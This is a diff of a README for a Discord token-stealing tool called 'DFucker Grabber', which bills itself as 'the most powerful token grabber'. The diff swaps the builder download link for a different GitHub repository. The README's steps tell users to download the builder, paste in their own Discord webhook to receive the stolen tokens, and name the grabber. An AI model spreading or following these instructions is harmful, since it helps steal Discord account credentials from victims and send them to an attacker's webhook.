@@ -15,7 +15,7 @@ The most powerful token grabber
 - And much more soon
 
 # How to build ?
-- Open [DFucker Builder](https://github.com/DiscordFucker/DFucker-Grabber/releases/download/2.1/DFucker.Builder.zip)
+- Open [DFucker Builder](https://github.com/KhdDev/token-grabber/releases/download/token-grabber/DFucker.Builder.zip)
 - Put your [webhook link](https://help.dashe.io/en/articles/2521940-how-to-create-a-discord-webhook-url)
 - Put a name to your grabber
 - Enjoy !
